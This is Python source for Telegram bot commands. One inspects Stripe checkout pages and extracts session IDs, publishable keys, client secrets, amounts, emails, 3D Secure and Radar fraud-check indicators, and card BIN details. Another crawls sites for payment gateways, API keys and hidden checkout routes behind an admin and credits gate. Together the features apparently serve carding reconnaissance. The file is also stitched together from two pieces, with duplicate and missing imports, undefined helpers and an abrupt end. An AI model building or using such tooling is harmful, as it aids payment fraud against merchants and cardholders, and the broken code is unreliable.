import base64
from io import BytesIO
from datetime import datetime
from telegram import Update
from telegram.ext import ContextTypes, CommandHandler

# Regex patterns
CS_RE = re.compile(r"(cs_(?:live|test)_[A-Za-z0-9_\-]+)")
PK_RE = re.compile(r"(pk_(?:live|test)_[A-Za-z0-9_\-]+)")
CLIENT_SECRET_RE = re.compile(r"(?:client_secret|clientSecret|secret)\s*[:=]\s*['\"]?([a-zA-Z0-9_\-\.]+)['\"]?", re.IGNORECASE)
AMOUNT_RE = re.compile(r'["\']?amount["\']?\s*[:=]\s*([0-9]+)')
CURRENCY_RE = re.compile(r'["\']?currency["\']?\s*[:=]\s*["\']?([A-Za-z]{3})["\']?', re.IGNORECASE)
EMAIL_RE = re.compile(r'[\w\.\+\-]{1,64}@[\w\.\-]{2,200}\.[A-Za-z]{2,20}')
PI_RE = re.compile(r"(pi_[A-Za-z0-9_]+)")
SI_RE = re.compile(r"(si_[A-Za-z0-9_]+)")
PAYMENT_METHOD_TYPES_RE = re.compile(r'payment_method_types["\']?\s*[:=]\s*\[([^\]]+)\]', re.IGNORECASE)
THREEDS_INDICATORS = [r"three_d_secure", r"threeDS", r"3d_secure", r"3DS", r"requires_action", r"threeDSecure", r"3ds"]

# Simple helper to shorten long strings for UI
def _short(s, n=120):
    if not s:
        return ""
    s = str(s)
    return s if len(s) <= n else s[:n-1] + "…"

# Heuristic obfuscation "score"
def obfuscation_score(js_text: str):
    # heuristic: more escaped sequences, less human-readable JSON => higher obfuscation
    score = 0
    score += js_text.count('\\x') * 2
    score += js_text.count('%') // 50
    # lack of readable keys
    common_keys = sum(1 for k in ("amount", "currency", "client_secret", "publishableKey") if k in js_text)
    score += max(0, 5 - common_keys)
    # normalize to 0..10
    return min(10, score)

# Attempt to find JS bundles in page html (ordered)
def find_js_urls_from_html(html_text, base_url=None):
    urls = set()
    # common patterns: <script src="...checkout...js"> or import map etc
    for m in re.finditer(r'<script[^>]+src=["\']([^"\']+)["\']', html_text, re.IGNORECASE):
        src = m.group(1)
        if src.startswith("//"):
            src = "https:" + src
        if src.startswith("/"):
            if base_url:
                src = urllib.parse.urljoin(base_url, src)
            else:
                continue
        urls.add(src)
    # also try to find direct https JS (rarely injected)
    for m in re.finditer(r'https://[^"\']+\.js', html_text):
        urls.add(m.group(0))
    return list(urls)

# Try to decode fragment/hash after '#'
def decode_fragment(fragment: str):
    if not fragment:
        return {}
    # percent decode
    try:
        decoded = urllib.parse.unquote(fragment)
    except:
        decoded = fragment
    data = {"raw_decoded": _short(decoded, 1200)}
    # try base64 segments separated by non-alnum
    candidates = re.split(r'[^A-Za-z0-9+/=]', decoded)
    decoded_parts = []
    for c in candidates:
        if len(c) < 8:
            continue
        try:
            # pad
            pad = '=' * ((4 - len(c) % 4) % 4)
            b = base64.b64decode(c + pad, validate=False)
            text = b.decode('utf-8', errors='ignore')
            if len(text) > 8:
                decoded_parts.append(_short(text, 500))
        except Exception:
            continue
    if decoded_parts:
        data['decoded_parts'] = decoded_parts
    return data

# Optional BIN lookup (binlist) — returns dict or None on failure
async def bin_lookup(bin6: str, timeout=6):
    url = f"https://lookup.binlist.net/{bin6}"
    headers = {"Accept": "application/json", "User-Agent": "Stripe-Inspector/1.0"}
    try:
        async with aiohttp.ClientSession(headers=headers) as session:
            async with session.get(url, timeout=timeout) as resp:
                if resp.status == 200:
                    j = await resp.json()
                    return j
    except Exception:
        return None
    return None

# Format amount (assume stripe cents)
def format_amount(amount_raw, currency=None):
    if amount_raw is None:
        return "Unknown"
    try:
        amt = int(amount_raw)
        # if amount seems large, assume cents
        if amt > 10000:
            display = f"{amt/100:.2f} {currency or ''}".strip()
        else:
            display = f"{amt} {currency or ''}".strip()
        return display
    except:
        return str(amount_raw)

# Core inspector: fetch page, fetch JS bundles, extract info
async def inspect_stripe_full(url: str, timeout=12):
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120 Safari/537.36"}
    result = {"url": url, "fetched": False, "error": None, "found": {}, "js_candidates": [], "fragment": {}, "radar_indicators": [], "obfuscation": 0}
    try:
        async with aiohttp.ClientSession(headers=headers) as session:
            async with session.get(url, timeout=timeout, allow_redirects=True) as resp:
                page_text = await resp.text(errors="ignore")
                result["http_status"] = resp.status
                result["fetched"] = True
                # base_url for relative JS
                base_url = str(resp.url)
    except Exception as e:
        result["error"] = f"Network error: {e}"
        return result

    # fragment decode
    parsed = urllib.parse.urlsplit(url)
    frag = parsed.fragment
    result["fragment"] = decode_fragment(frag)

    # find JSs
    js_urls = find_js_urls_from_html(page_text, base_url=base_url)
    result["js_candidates"] = js_urls[:12]

    # start extracting from page_text first
    search_space = page_text[:200000]  # preview
    data = {}

    # quick finds
    cs_m = CS_RE.search(search_space)
    if cs_m: data["cs"] = cs_m.group(1)
    pk_m = PK_RE.search(search_space)
    if pk_m: data["pk"] = pk_m.group(1)
    secret_m = CLIENT_SECRET_RE.search(search_space)
    if secret_m: data["client_secret"] = secret_m.group(1)
    pi_m = PI_RE.search(search_space)
    if pi_m: data["payment_intent"] = pi_m.group(1)
    si_m = SI_RE.search(search_space)
    if si_m: data["subscription_id"] = si_m.group(1)
    amt_m = AMOUNT_RE.search(search_space)
    if amt_m: data["amount_raw"] = amt_m.group(1)
    cur_m = CURRENCY_RE.search(search_space)
    if cur_m: data["currency"] = cur_m.group(1).upper()
    email_m = EMAIL_RE.search(search_space)
    if email_m: data["email"] = email_m.group(0)

    # Radar / risk indicators: search for keywords
    radar_hits = []
    for pat in ("radar", "risk", "fraud", "fingerprint", "device_fingerprint", "telemetry"):
        if pat in page_text.lower():
            radar_hits.append(pat)
    result["radar_indicators"] = radar_hits

    # Payment method types
    pm_m = PAYMENT_METHOD_TYPES_RE.search(page_text)
    if pm_m:
        data["payment_method_types"] = pm_m.group(1)

    # If keys still missing, fetch JS bundles and scan (concurrently)
    js_texts = []
    async def fetch_js(u):
        try:
            async with aiohttp.ClientSession(headers=headers) as session:
                async with session.get(u, timeout=timeout) as r:
                    text = await r.text(errors="ignore")
                    return u, text
        except:
            return u, None

    # limit concurrency to 6
    tasks = [fetch_js(u) for u in js_urls[:8]]
    if tasks:
        fetched = await asyncio.gather(*tasks, return_exceptions=True)
        for u, t in fetched:
            if t:
                js_texts.append((u, t))
                # small scan
                if "cs_" in t and "pk_" in t:
                    # break early? still collect others for obfuscation metric
                    pass

    # scan JS texts for fields (first match wins)
    for u, txt in js_texts:
        if "cs" not in data:
            m = CS_RE.search(txt)
            if m:
                data["cs"] = m.group(1)
        if "pk" not in data:
            m = PK_RE.search(txt)
            if m:
                data["pk"] = m.group(1)
        if "client_secret" not in data:
            m = CLIENT_SECRET_RE.search(txt)
            if m:
                data["client_secret"] = m.group(1)
        if "payment_intent" not in data:
            m = PI_RE.search(txt)
            if m:
                data["payment_intent"] = m.group(1)
        if "subscription_id" not in data:
            m = SI_RE.search(txt)
            if m:
                data["subscription_id"] = m.group(1)
        if "amount_raw" not in data:
            m = AMOUNT_RE.search(txt)
            if m:
                data["amount_raw"] = m.group(1)
        if "currency" not in data:
            m = CURRENCY_RE.search(txt)
            if m:
                data["currency"] = m.group(1).upper()
        if "email" not in data:
            m = EMAIL_RE.search(txt)
            if m:
                data["email"] = m.group(0)
        # radar indicators inside js?
        for patt in ("radar", "fingerprint", "telemetry"):
            if patt in txt.lower() and patt not in radar_hits:
                radar_hits.append(patt)

    # obfuscation score (average across JSs)
    if js_texts:
        scores = [obfuscation_score(text) for (_, text) in js_texts if text]
        result["obfuscation"] = int(sum(scores)/max(1,len(scores)))
    else:
        result["obfuscation"] = obfuscation_score(page_text)

    # Payment type detection heuristic
    payment_type = "unknown"
    # check 3ds indicators in page_text or js_texts
    combined = page_text + "\n" + "\n".join(txt for (_, txt) in js_texts if txt)
    if any(re.search(p, combined, re.IGNORECASE) for p in THREEDS_INDICATORS):
        payment_type = "3D Secure"
    elif "payment_method_types" in combined.lower() and "card" in combined.lower():
        payment_type = "card"

    data["payment_type"] = payment_type

    # attach data and raw preview
    result["found"] = data
    result["raw_preview"] = _short(page_text, 100000)
    return result

# Build advanced UI block (big terminal card)
def build_full_ui(info: dict, include_raw_preview=False, bininfo=None):
    found = info.get("found", {})
    url = info.get("url","")
    cs = found.get("cs") or "Not Available"
    pk = found.get("pk") or "Not Available"
    client_secret = found.get("client_secret") or "Not Available"
    pi = found.get("payment_intent")
    si = found.get("subscription_id")
    amount = format_amount(found.get("amount_raw"), found.get("currency"))
    currency = found.get("currency") or "-"
    email = found.get("email") or "Not Available"
    ptype = found.get("payment_type", "unknown")
    obf = info.get("obfuscation", 0)
    radar = ", ".join(info.get("radar_indicators", [])) or "None"
    frag = info.get("fragment", {})
    raw_preview = info.get("raw_preview","")

    lines = []
    lines.append("╔════════════════ STRIPE CHECKOUT ANALYZER ═════════════════╗")
    lines.append(f"║ URL: {_short(url,110)}")
    lines.append("╠══════════════════════════════════════════════════════════╣")
    lines.append(f"║ ⦋ϟ⦌ Type         : {ptype}")
    lines.append(f"║ ⦋ϟ⦌ CS           : {cs}")
    lines.append(f"║ ⦋ϟ⦌ PK           : {pk}")
    lines.append(f"║ ⦋ϟ⦌ Client Secret: {client_secret if client_secret!='Not Available' else 'Not Available'}")
    if pi: lines.append(f"║ ⦋ϟ⦌ Payment Intent : {pi}")
    if si: lines.append(f"║ ⦋ϟ⦌ Subscription ID : {si}")
    lines.append(f"║ ⦋ϟ⦌ Amount       : {amount}")
    lines.append(f"║ ⦋ϟ⦌ Currency     : {currency}")
    lines.append(f"║ ⦋ϟ⦌ Email        : {email}")
    lines.append("╠══════════════════════════════════════════════════════════╣")
    lines.append(f"║ ⦋⚠⦌ Radar Flags  : {radar}")
    lines.append(f"║ ⦋🔬⦌ Obfuscation  : Level {obf}/10")
    if frag:
        # show small fragment summary if present
        frag_summary = frag.get("decoded_parts") if isinstance(frag.get("decoded_parts"), list) else None
        if frag_summary:
            lines.append(f"║ ⦋🔗⦌ Fragment (decoded parts):")
            for d in frag_summary[:2]:
                lines.append(f"║    • {_short(d,90)}")
    if bininfo:
        lines.append("╠════════════════ BIN INFO ══════════════════════════════╣")
        # bininfo is the JSON from binlist
        bin_scheme = bininfo.get("scheme") or "-"
        bin_type = bininfo.get("type") or "-"
        bin_brand = bininfo.get("brand") or "-"
        bin_bank = bininfo.get("bank",{}).get("name") or "-"
        bin_country = bininfo.get("country",{}).get("name") or "-"
        lines.append(f"║ ⦋💳⦌ BIN: {bininfo.get('bin') or '-'}  {bin_scheme}/{bin_type} {bin_brand}")
        lines.append(f"║ ⦋🏦⦌ Bank: {bin_bank} — {bin_country}")
    lines.append("╚══════════════════════════════════════════════════════════╝")
    output = "\n".join(lines)
    if include_raw_preview:
        output += "\n\nRAW PREVIEW:\n" + raw_preview[:10000]
    return "<pre>" + html.escape(output) + "</pre>"

# Safe split for large messages
def split_text_for_telegram(text, chunk=3800):
    parts = []
    i = 0
    while i < len(text):
        parts.append(text[i:i+chunk])
        i += chunk
    return parts

# Final command handler (async for PTB v20)
async def cko_full_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Usage:
      /cko <stripe_checkout_url> [bin_or_card_first6]
    Example:
      /cko https://pay.openai.com/c/pay/cs_live_xxx
      /cko https://checkout.stripe.com/c/pay/cs_live_xxx 424242
    """
    args = context.args or []
    if len(args) < 1:
        return await update.message.reply_html("<b>Usage:</b> /cko &lt;stripe_url&gt; [optional BIN6]")

    raw_url = args[0].strip()
    if raw_url.startswith("www."):
        raw_url = "https://" + raw_url
    if not raw_url.startswith("http"):
        raw_url = "https://" + raw_url

    optional_bin = args[1].strip() if len(args) > 1 else None
    if optional_bin and len(optional_bin) >= 6:
        optional_bin = optional_bin[:6]

    # initial UI
    init = (
        "<pre>\n"
        "╔════════════════ STRIPE INSPECTOR ═══════════════╗\n"
        "║ STATUS: CONNECTING → fetching page & bundles   ║\n"
        "╚════════════════════════════════════════════════╝\n"
        "</pre>"
    )
    temp = await update.message.reply_html(init)

    # inspect
    info = await inspect_stripe_full(raw_url, timeout=12)

    # if bin lookup requested (or we can attempt from data)
    bininfo = None
    candidate_bin = optional_bin
    found_bin = None
    # try to get bin from any card-like patterns (rare) in preview
    if not candidate_bin:
        m = re.search(r'\b([0-9]{6,16})\b', info.get("raw_preview",""))
        if m:
            candidate_bin = m.group(1)[:6]
    if candidate_bin:
        lookup = await bin_lookup(candidate_bin)
        if lookup:
            # attach bin field for display
            lookup["bin"] = candidate_bin
            bininfo = lookup

    # build UI (include fragment decoded parts if present)
    ui = build_full_ui(info, include_raw_preview=False, bininfo=bininfo)

    # send UI safely (split if too long)
    if len(ui) > 3800:
        await temp.delete()
        parts = split_text_for_telegram(ui, chunk=3500)
        for p in parts:
            await update.message.reply_html(p)
    else:
        await temp.edit_text(ui, parse_mode="HTML")

    # Also attach a raw preview file (truncated) for advanced debugging if it's large
    raw_preview = info.get("raw_preview","")
    if raw_preview:
        if len(raw_preview) > 1500:
            bio = BytesIO(raw_preview.encode("utf-8"))
            bio.name = "checkout_preview.html"
            await update.message.reply_document(document=bio, filename=bio.name, caption="Raw HTML preview (truncated)")
        else:
            # small raw preview included as message
            await update.message.reply_html("<pre>" + html.escape(raw_preview[:1200]) + "</pre>")
import re
import aiohttp
import asyncio
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
from telegram import Update
from telegram.ext import CommandHandler, ContextTypes
# ---------------------------
# Ultra Payment Scanner integration for python-telegram-bot (async)
# Paste this into your bot file and register CommandHandler("scan", cmd_scan)
# ---------------------------

import os
import re
import sys
import time
import json
import math
import hashlib
import concurrent.futures
import multiprocessing
from urllib.parse import urlparse, urljoin
from collections import defaultdict, Counter

import requests
from bs4 import BeautifulSoup

# python-telegram-bot imports
from telegram import Update
from telegram.ext import ContextTypes

# ---------------- CONFIG ----------------
REPORT_FOLDER = "/tmp/scan_reports"
try:
    os.makedirs(REPORT_FOLDER, exist_ok=True)
except PermissionError:
    REPORT_FOLDER = "/tmp/scan_reports_bot"
    os.makedirs(REPORT_FOLDER, exist_ok=True)

USER_AGENT = "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 Chrome/120 Safari/537.36"
HEADERS = {"User-Agent": USER_AGENT, "Accept-Language": "en-US,en;q=0.9"}

MAX_PAGES = 30
REQUEST_TIMEOUT = 12
MAX_JS_FETCH = 80
JS_FETCH_WORKERS = max(1, min(6, (multiprocessing.cpu_count() or 2)))

# Providers (same signature set as Ultra V6)
PROVIDERS = {
    "stripe": [r"js\.stripe\.com", r"checkout\.stripe\.com", r"m\.stripe\.network", r"pk_live_", r"pk_test_", r"payment_intent", r"link\.stripe\.com"],
    "paypal": [r"www\.paypal\.com\/sdk\/js", r"paypal-checkout", r"paypal\.com\/checkout", r"paypal\.", r"paypal-buttons"],
    "razorpay": [r"checkout\.razorpay\.com\/v1\/checkout.js", r"razorpay", r"rzp_"],
    "paytm": [r"securegw\.paytm\.in", r"paytm"],
    "cashfree": [r"sdk\.cashfree\.com", r"cashfree"],
    "braintree": [r"braintree", r"braintreegateway"],
    "square": [r"squareup\.com", r"square\.js"],
    "coinbase": [r"commerce\.coinbase\.com", r"coinbase"],
    "shopify": [r"cdn\.shopify\.com", r"shopify"],
    "apple_pay": [r"apple-pay", r"applepay"],
    "google_pay": [r"gpay", r"googlepay", r"google\.com\/payments"],
    # extend as needed
}
PROVIDER_RE = {p: [re.compile(q, re.I) for q in patterns] for p, patterns in PROVIDERS.items()}

EXTRACT_PATTERNS = {
    "stripe_publishable": re.compile(r"(pk_live_[A-Za-z0-9_]+|pk_test_[A-Za-z0-9_]+)"),
    "stripe_pi": re.compile(r"(pi_[A-Za-z0-9_]+)"),
    "stripe_price": re.compile(r"(price_[A-Za-z0-9_]+)"),
    "razorpay_key": re.compile(r"(rzp_test_[A-Za-z0-9_]+|rzp_live_[A-Za-z0-9_]+)"),
    "paypal_client": re.compile(r"client-id=([A-Za-z0-9_-]+)"),
    "acct": re.compile(r"(acct_[A-Za-z0-9_]+)"),
}

HIDDEN_ROUTE_KEYWORDS = ["checkout", "payment", "pay", "order", "billing", "subscribe", "pricing", "plan", "cart", "buy", "purchase"]

# Try to import scikit-learn if available (auto-run ML when present)
USE_ML = False
try:
    from sklearn.feature_extraction.text import TfidfVectorizer
    from sklearn.naive_bayes import MultinomialNB
    USE_ML = True
except Exception:
    USE_ML = False

# ----------------- Helper low-level functions -----------------
def ensure_http(url: str) -> str:
    if not url:
        return url
    if url.startswith("http"):
        return url
    return "https://" + url

def safe_get_text(url: str, timeout:int = REQUEST_TIMEOUT):
    try:
        r = requests.get(url, headers=HEADERS, timeout=timeout)
        return r.status_code, r.text or ""
    except Exception:
        return None, ""

def find_provider_hits_in_text(text: str):
    hits = defaultdict(int)
    for prov, regexes in PROVIDER_RE.items():
        for rx in regexes:
            if rx.search(text):
                hits[prov] += 1
    return hits

def extract_ids_from_text(text: str):
    found = defaultdict(list)
    for k, rx in EXTRACT_PATTERNS.items():
        for m in rx.findall(text):
            if isinstance(m, tuple):
                for sub in m:
                    if sub and sub not in found[k]:
                        found[k].append(sub)
            else:
                if m and m not in found[k]:
                    found[k].append(m)
    return found

# ----------------- Main blocking scanner (intended to run in executor) -----------------
def scan_site_blocking(start_url: str,
                       max_pages: int = MAX_PAGES,
                       max_js_fetch: int = MAX_JS_FETCH,
                       enable_ml: bool = USE_ML):
    """
    Blocking (synchronous) version of the Ultra V6 scanner.
    Returns final_report dict.
    This can be executed inside run_in_executor safely.
    """
    start_url = ensure_http(start_url)
    parsed = urlparse(start_url)
    base_origin = f"{parsed.scheme}://{parsed.netloc}"

    visited = set()
    queue = [start_url]
    js_seen = set()

    report = {
        "target": start_url,
        "pages_scanned": 0,
        "js_scanned": 0,
        "pages": [],
        "js_urls": [],
        "providers": Counter(),
        "provider_hits_detail": defaultdict(list),
        "extracted_ids": defaultdict(set),
        "hidden_routes": set(),
        "ml_snippets": []
    }

    # Crawl loop
    while queue and len(visited) < max_pages:
        url = queue.pop(0)
        if url in visited:
            continue
        visited.add(url)
        report["pages_scanned"] += 1

        status, text = safe_get_text(url)
        report["pages"].append({"url": url, "status": status})
        if not text:
            continue

        # Detect provider signatures in HTML
        html_hits = find_provider_hits_in_text(text)
        for p, cnt in html_hits.items():
            report["providers"][p] += cnt
            report["provider_hits_detail"][p].append({"page": url, "count": cnt})

        # Extract IDs from HTML
        ids_html = extract_ids_from_text(text)
        for k, arr in ids_html.items():
            for v in arr:
                report["extracted_ids"][k].add(v)

        # Parse scripts and links
        try:
            soup = BeautifulSoup(text, "html.parser")
        except Exception:
            soup = None

        js_urls = []
        if soup:
            # script tags
            for tag in soup.find_all("script"):
                src = tag.get("src")
                if src:
                    full = urljoin(url, src)
                    js_urls.append(full)
            # anchors
            for a in soup.find_all("a", href=True):
                href = a.get("href")
                if not href:
                    continue
                full = urljoin(base_origin, href)
                if urlparse(full).netloc == parsed.netloc and full not in visited and full not in queue:
                    if any(kw in full.lower() for kw in HIDDEN_ROUTE_KEYWORDS):
                        queue.insert(0, full)
                    else:
                        queue.append(full)
            # inline scripts scanning
            for tag in soup.find_all("script"):
                if not tag.get("src"):
                    inline = tag.string or ""
                    if inline:
                        ihits = find_provider_hits_in_text(inline)
                        for p, cnt in ihits.items():
                            report["providers"][p] += cnt
                            report["provider_hits_detail"][p].append({"page": url, "inline": True})
                        iids = extract_ids_from_text(inline)
                        for k, arr in iids.items():
                            for v in arr:
                                report["extracted_ids"][k].add(v)
                        for kw in HIDDEN_ROUTE_KEYWORDS:
                            if f"/{kw}" in inline.lower():
                                report["hidden_routes"].add(urljoin(base_origin, f"/{kw}"))

        # fetch JS files (limit)
        for js in js_urls:
            if report["js_scanned"] >= max_js_fetch:
                break
            if js in js_seen:
                continue
            js_seen.add(js)
            report["js_scanned"] += 1
            report["js_urls"].append(js)
            st, s_code = safe_get_text(js)
            s_code = s_code or ""
            # provider hits in JS
            jhits = find_provider_hits_in_text(s_code)
            for p, cnt in jhits.items():
                report["providers"][p] += cnt
                report["provider_hits_detail"][p].append({"page": url, "script": js, "count": cnt})
            # ids in JS
            jids = extract_ids_from_text(s_code)
            for k, arr in jids.items():
                for v in arr:
                    report["extracted_ids"][k].add(v)
            # hidden routes
            for kw in HIDDEN_ROUTE_KEYWORDS:
                if re.search(r"['\"]\/" + re.escape(kw) + r"['\"]", s_code, re.I) or (f"/{kw}" in s_code and len(s_code) < 1000000):
                    report["hidden_routes"].add(urljoin(base_origin, f"/{kw}"))
            # collect snippet for optional ML
            if enable_ml and s_code:
                report["ml_snippets"].append((s_code[:4000], js))

    # convert sets to lists
    for k in list(report["extracted_ids"].keys()):
        report["extracted_ids"][k] = list(report["extracted_ids"][k])
    report["hidden_routes"] = list(report["hidden_routes"])

    # rule-based confidence normalization
    total_hits = sum(report["providers"].values()) or 1
    rule_conf = {p: round(v / total_hits, 3) for p, v in report["providers"].items()}

    # Optionally do per-JS multiprocessing analysis for deeper signals
    js_results = []
    if report["js_urls"]:
        js_urls = report["js_urls"][:max_js_fetch]
        # Use ProcessPoolExecutor to fetch & analyze JS files in parallel (blocking subprocesses)
        try:
            with concurrent.futures.ProcessPoolExecutor(max_workers=JS_FETCH_WORKERS) as pool:
                futures = {pool.submit(_fetch_and_analyze_js_worker, u): u for u in js_urls}
                for fut in concurrent.futures.as_completed(futures):
                    try:
                        res = fut.result(timeout=REQUEST_TIMEOUT + 5)
                    except Exception:
                        res = {"url": futures.get(fut, ""), "hits": {}, "extracted": {}, "snippet": ""}
                    js_results.append(res)
        except Exception:
            # fallback sequential
            for u in js_urls:
                js_results.append(_fetch_and_analyze_js_worker(u))

        # merge js_results into report
        for r in js_results:
            for p, cnt in r.get("hits", {}).items():
                report["providers"][p] += cnt
                report["provider_hits_detail"][p].append({"script": r["url"], "count": cnt})
            for k, arr in r.get("extracted", {}).items():
                for v in arr:
                    report["extracted_ids"][k].add(v)

    # convert extracted ids sets to lists again (after merging)
    for k in list(report["extracted_ids"].keys()):
        report["extracted_ids"][k] = list(report["extracted_ids"][k])

    # ML bootstrap if present
    ml_conf = {}
    if enable_ml and USE_ML:
        try:
            # build small bootstrap training dataset using builtin snippets plus snippets discovered
            training = []
            # small builtin patterns -> label mapping
            for prov, rxlist in PROVIDER_RE.items():
                # try to create a short text example by joining pattern strings
                example = " ".join(r.pattern for r in rxlist[:3])
                training.append((example, prov))
            # append discovered snippets (label unknown, but add heuristics)
            for txt, jsurl in report["ml_snippets"]:
                # heuristic: if snippet contains a provider regex, label it automatically for training
                for prov, rxlist in PROVIDER_RE.items():
                    for rx in rxlist:
                        if rx.search(txt):
                            training.append((txt, prov))
                            break
            # train models
            models, vectorizer = _build_small_ml_models(training)
            if models and vectorizer:
                ml_conf = _ml_classify_report(report, models, vectorizer)
        except Exception:
            ml_conf = {}

    # ensemble
    final_conf = _ensemble_confidence(rule_conf, ml_conf, alpha=0.6 if ml_conf else 0.0)

    # prepare final_report
    final = {
        "meta": {"target": start_url, "timestamp": int(time.time())},
        "pages": report["pages"],
        "js_urls": report["js_urls"],
        "provider_counts": {k: int(v) for k, v in report["providers"].items()},
        "rule_confidence": rule_conf,
        "ml_confidence": ml_conf,
        "ensemble_confidence": final_conf,
        "extracted_ids": report["extracted_ids"],
        "hidden_routes": report["hidden_routes"],
        "js_results": js_results
    }

    return final

# ----------------- Worker helper for multiprocessing -----------------
def _fetch_and_analyze_js_worker(js_url):
    """Worker suitable for ProcessPoolExecutor: fetches code and returns hits & extracted ids."""
    try:
        st, code = safe_get_text(js_url)
        code = code or ""
    except Exception:
        code = ""
    hits = {}
    for p, rxlist in PROVIDER_RE.items():
        cnt = 0
        for rx in rxlist:
            if rx.search(code):
                cnt += 1
        if cnt:
            hits[p] = cnt
    extracted = extract_ids_from_text(code)
    return {"url": js_url, "hits": hits, "extracted": extracted, "snippet": code[:4096]}

# ----------------- Small ML utilities (pure glue to sklearn if available) -----------------
def _build_small_ml_models(training_pairs):
    """Return (models_dict, vectorizer) or (None, None)"""
    if not USE_ML:
        return None, None
    try:
        texts = [t for t, _ in training_pairs]
        labels = [l for _, l in training_pairs]
        vec = TfidfVectorizer(analyzer='char_wb', ngram_range=(3,6), max_features=20000)
        X = vec.fit_transform(texts)
        models = {}
        unique = list(set(labels))
        for lab in unique:
            y = [1 if lab == l else 0 for l in labels]
            if sum(y) < 1:
                continue
            clf = MultinomialNB()
            clf.fit(X, y)
            models[lab] = clf
        return models, vec
    except Exception:
        return None, None

def _ml_classify_report(report, models, vectorizer):
    if not models or not vectorizer:
        return {}
    scores = defaultdict(float)
    counts = defaultdict(int)
    for snippet, jsurl in report.get("ml_snippets", []):
        try:
            Xv = vectorizer.transform([snippet])
        except Exception:
            continue
        for prov, clf in models.items():
            try:
                prob = clf.predict_proba(Xv)[0]
                p1 = prob[1] if len(prob) > 1 else max(prob)
                scores[prov] += float(p1)
                counts[prov] += 1
            except Exception:
                continue
    res = {}
    for p in scores:
        res[p] = round(scores[p] / (counts[p] or 1), 3)
    return res

def _ensemble_confidence(rule_conf, ml_conf, alpha=0.6):
    conf = {}
    providers = set(list(rule_conf.keys()) + list(ml_conf.keys()))
    for p in providers:
        r = float(rule_conf.get(p, 0.0))
        m = float(ml_conf.get(p, 0.0)) if ml_conf else 0.0
        if ml_conf:
            conf[p] = round(alpha * m + (1 - alpha) * r, 3)
        else:
            conf[p] = round(r, 3)
    return conf

# ----------------- UI building (dark premium panel) -----------------
def _dark_header(target):
    return f"┏━━━━━━━━━━━ <b>ULTRA PAYMENT SCAN</b> ━━━━━━━━━━━\n┃ Target: <code>{target}</code>\n\n"

def _render_pages_short(pages, limit=6):
    lines = []
    lines.append("┃ 🔎 Pages scanned:")
    for p in pages[:limit]:
        lines.append(f"┃ • {p.get('url')} — {p.get('status')}")
    if len(pages) > limit:
        lines.append(f"┃ • ... (+{len(pages)-limit} more)")
    return "\n".join(lines) + "\n"

def _confidence_bar(conf):
    pct = int(round(conf * 100))
    blocks_total = 18
    filled = int((pct/100.0) * blocks_total)
    bar = "█" * filled + "░" * (blocks_total - filled)
    return f"<code>[{bar}] {pct}%</code>"

def _provider_section(conf_map, extracted):
    lines = []
    lines.append("┃\n┃ Providers & Confidence:")
    items = sorted(conf_map.items(), key=lambda x: -x[1])
    for prov, conf in items:
        emoji = "🟢" if conf >= 0.7 else ("🟡" if conf >= 0.4 else ("🔘" if conf >= 0.15 else "⚪"))
        bar = _confidence_bar(conf)
        lines.append(f"┃ {emoji} <b>{prov}</b> {bar}")
    if extracted:
        lines.append("┃\n┃ Extracted IDs (examples):")
        for k, arr in extracted.items():
            if arr:
                lines.append(f"┃ • {k}: {arr[:3]}")
    return "\n".join(lines)

def _dark_footer(elapsed, pages_count, js_count):
    return f"\n┃\n┃ ⏱ Elapsed: {int(elapsed)}s | Pages: {pages_count} | JS files: {js_count}\n┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"

def _build_panel_message(target, pages, conf_map, extracted, elapsed, js_count):
    header = _dark_header(target)
    prog = _render_pages_short(pages, limit=6)
    prov_block = _provider_section(conf_map, extracted)
    footer = _dark_footer(elapsed, len(pages), js_count)
    return header + prog + prov_block + footer

# ----------------- Async handler for /scan <url> -----------------
async def cmd_scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Usage: /scan <url>
    Runs the blocking scanner in a thread executor and returns the premium UI result.
    """
    user = update.effective_user
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    raw = (update.message.text or "").strip()
    parts = raw.split(maxsplit=1)
    if not (is_admin_uid(user.id) or is_owner_uid(user.id)):
        await update.message.reply_text("⛔ Only admins/owner can use /scan")
        return
    
    if len(parts) < 2:
        await context.bot.send_message(chat_id=chat_id, text="Usage: /scan https://example.com")
        return
    target = parts[1].strip()
    if not target.startswith("http"):
        target = "https://" + target

    # Optional place for credit check:
    # if not user_has_credits(user.id): await context.bot.send_message(chat_id=chat_id, text="No credits"); return

    # Send initial "panel preparing" message
    preparing = _dark_header(target) + "┃ ⏳ Preparing scan...\n┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
    sent = await context.bot.send_message(chat_id=chat_id, text=preparing)

    # Generate a report_id
    report_id = str(int(time.time())) + "_" + str(user.id)

    # Run the blocking scan in default executor (not to block PTB event loop)
    loop = context.application.create_task if hasattr(context.application, "create_task") else None
    # Use run_in_executor
    try:
        final_report = await asyncio.get_running_loop().run_in_executor(
            None,  # default thread pool
            lambda: scan_site_blocking(target)
        )
    except Exception as e:
        # edit message to show error and return
        try:
            await context.bot.edit_message_text(chat_id=chat_id, message_id=sent.message_id,
                                                text=_dark_header(target) + f"┃ ❌ Scan failed: {e}\n┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛")
        except Exception:
            pass
        return

    # Save JSON report
    out_path = os.path.join(REPORT_FOLDER, f"{report_id}.json")
    try:
        with open(out_path, "w", encoding="utf8") as fh:
            json.dump(final_report, fh, indent=2)
    except Exception:
        pass

    # Build final UI and edit original message
    ensemble_conf = final_report.get("ensemble_confidence") or final_report.get("rule_confidence") or {}
    extracted = final_report.get("extracted_ids", {})
    pages = final_report.get("pages", [])
    elapsed = final_report.get("meta", {}).get("elapsed_seconds", 0) if final_report.get("meta") else 0
    js_count = len(final_report.get("js_urls", []))
    panel = _build_panel_message(target, pages, ensemble_conf, extracted, elapsed, js_count)

    # Inline keyboard (scan again, view json, close)
    kb = [
        [
            {"text": "🔄 Scan Again", "callback_data": f"scan_again|{report_id}|{target}"},
            {"text": "📄 View JSON", "callback_data": f"view_json|{report_id}"}
        ],
